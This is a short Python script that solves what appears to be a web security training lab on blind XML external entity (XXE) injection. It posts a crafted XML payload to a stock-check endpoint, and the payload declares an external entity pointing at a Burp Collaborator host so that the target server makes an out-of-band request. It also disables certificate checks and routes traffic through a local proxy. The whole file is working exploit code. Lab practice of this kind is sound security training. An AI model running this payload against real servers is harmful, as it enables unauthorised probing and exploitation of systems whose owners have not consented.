import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def xxe_payload(url):
    # PREPARE URL
    stock_url = url + '/product/stock'

    # STORE PAYLOAD
    params = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE jito [ <!ENTITY xxe SYSTEM "http://xxe.burpcollaborator.net"> ] ><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

    # SEND PAYLOAD
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if "XML parsing error" not in r.text and r.status_code != 400:
        print("[-] Something went wrong!")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) != 2:
        print("[-] USage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Blind XXE with out-of-band interaction")
    print("""[+] This lab has a "Check stock" feature that parses XML input but does not display the result.
    You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.""")

    xxe_payload(url)

if __name__ == "__main__":
    main()